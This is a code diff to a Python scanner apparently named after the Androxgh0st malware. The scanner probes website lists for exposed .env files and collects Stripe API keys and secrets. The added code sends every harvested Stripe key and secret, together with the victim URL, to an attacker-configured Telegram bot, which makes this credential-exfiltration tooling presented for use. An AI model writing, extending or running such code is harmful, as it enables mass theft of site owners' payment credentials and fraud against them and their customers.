@@ -158,10 +158,40 @@ class androxgh0st:
 				with open(ARGS.json_out, 'a') as jf:
 					entry = {"url": url, "method": method, "stripe_key": stripe_key, "stripe_secret": stripe_secret}
 					jf.write(json.dumps(entry)+"\n")
+
+		# Send Telegram notification if configured
+		if ARGS and ARGS.telegram_bot_token and ARGS.telegram_chat_id:
+			telegram_message = f"🔑 <b>STRIPE KEY FOUND!</b>\n\n"
+			telegram_message += f"<b>URL:</b> {url}\n"
+			telegram_message += f"<b>METHOD:</b> {method}\n"
+			telegram_message += f"<b>STRIPE_KEY:</b> <code>{stripe_key}</code>\n"
+			telegram_message += f"<b>STRIPE_SECRET:</b> <code>{stripe_secret}</code>"
+			send_telegram(telegram_message, ARGS.telegram_bot_token, ARGS.telegram_chat_id)
+
 		return True
 
 def printf(text):
 	print(text)
+
+def send_telegram(message, bot_token, chat_id):
+	"""Send message to Telegram bot"""
+	try:
+		url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+		data = {
+			"chat_id": chat_id,
+			"text": message,
+			"parse_mode": "HTML"
+		}
+		response = requests.post(url, data=data, timeout=10)
+		if response.status_code == 200:
+			logger.info("Telegram notification sent successfully")
+			return True
+		else:
+			logger.error(f"Failed to send Telegram: {response.status_code} - {response.text}")
+			return False
+	except Exception as e:
+		logger.error(f"Error sending Telegram message: {str(e)}")
+		return False
 
 def cleanup_handler(signum=None, frame=None):
 	"""Graceful shutdown handler"""
@@ -301,6 +331,8 @@ if __name__ == '__main__':
 		parser.add_argument('--paths', dest='paths', nargs='*', help='Additional .env paths to try')
 		parser.add_argument('--rate', dest='rate', type=float, default=0.0, help='Sleep seconds between requests per task')
 		parser.add_argument('--json-out', dest='json_out', help='Write JSONL output to this file')
+		parser.add_argument('--telegram-bot-token', dest='telegram_bot_token', help='Telegram bot token for notifications')
+		parser.add_argument('--telegram-chat-id', dest='telegram_chat_id', help='Telegram chat ID to send notifications')
 		args = parser.parse_args()
 		if not args.list:
 			args.list = input("websitelist ? ")
